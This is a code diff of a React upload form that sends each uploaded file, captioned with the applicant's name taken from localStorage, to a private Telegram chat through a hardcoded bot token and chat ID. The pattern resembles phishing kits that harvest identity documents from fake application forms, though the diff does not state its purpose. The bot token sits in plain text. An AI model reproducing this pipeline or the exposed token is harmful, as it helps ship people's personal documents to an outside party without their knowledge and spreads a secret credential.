@@ -7,10 +7,10 @@ const TELEGRAM_BOT_TOKEN = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
 const TELEGRAM_CHAT_ID = "6639364559";
 const W3form: React.FC = () => {
  
-  // const storedData = localStorage.getItem("applicationData");
-  // const parsedData = storedData ? JSON.parse(storedData) : {};
+  const storedData = localStorage.getItem("applicationData");
+  const parsedData = storedData ? JSON.parse(storedData) : {};
 
-  // const fullName = parsedData.fullname || "N/A";
+  const fullName = parsedData.fullname || "N/A";
 
  
     
@@ -37,8 +37,10 @@ const W3form: React.FC = () => {
       for (const file of files) {
         const formData = new FormData();
         formData.append("chat_id", TELEGRAM_CHAT_ID);
-        formData.append("document", file); // Can also use "photo" for images
+         formData.append("document", file); // Can also use "photo" for images
+        formData.append("caption", `Document sent by ${fullName}`);
 
+        
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
           method: "POST",
           body: formData,
